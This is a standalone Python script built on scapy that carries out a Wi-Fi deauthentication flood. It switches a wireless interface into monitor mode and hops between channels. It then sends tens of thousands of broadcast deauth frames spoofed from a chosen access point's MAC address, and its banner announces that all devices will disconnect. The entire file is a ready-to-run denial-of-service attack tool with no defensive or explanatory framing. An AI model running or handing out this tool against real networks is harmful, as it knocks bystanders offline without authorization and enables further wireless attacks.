#!/usr/bin/env python3
from scapy.all import *
import os
import threading

welcome = r"""
  _                     __ 
 |_) ._ _   _. |  |\ | (_  
 |_) | (/_ (_| |< | \| __) 
                           """

print(welcome)

INTERFACE = "wlan1"

os.system(f"sudo ip link set {INTERFACE} down")
os.system(f"sudo iw dev {INTERFACE} set type monitor")
os.system(f"sudo ip link set {INTERFACE} up")
os.system(f"sudo iw dev {INTERFACE} set power_save off")

ap = input("\n\nAP MAC: ").strip().upper()


def hop():
    while True:
        for ch in [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10]:
            os.system(f"sudo iw dev {INTERFACE} set channel {ch}")
            threading.Event().wait(0.02)


threading.Thread(target=hop, daemon=True).start()

pkt1 = (
    RadioTap()
    / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap, addr3=ap)
    / Dot11Deauth(reason=7)
)
pkt2 = (
    RadioTap()
    / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap, addr3=ap)
    / Dot11Deauth(reason=1)
)
pkt3 = (
    RadioTap()
    / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap, addr3=ap)
    / Dot11Deauth(reason=4)
)

print(f"\nDeauth : {ap}")
print("ALL DEVICE WILL DISCONNECT INSTANTLY!\n")

count = 0
try:
    while True:
        sendp(pkt1, iface=INTERFACE, count=5000, inter=0.00001, verbose=0)
        sendp(pkt2, iface=INTERFACE, count=5000, inter=0.00001, verbose=0)
        sendp(pkt3, iface=INTERFACE, count=5000, inter=0.00001, verbose=0)
        count += 15000
        print(f"\rPACKETS: {count:,} | STATUS: DEAUTH", end="", flush=True)
except KeyboardInterrupt:
    print("\n\n[✓] Stopping...")
    os.system(f"sudo ip link set {INTERFACE} down")
    os.system(f"sudo iw dev {INTERFACE} set type managed")
    os.system(f"sudo ip link set {INTERFACE} up")
    print("[✓] Done!")
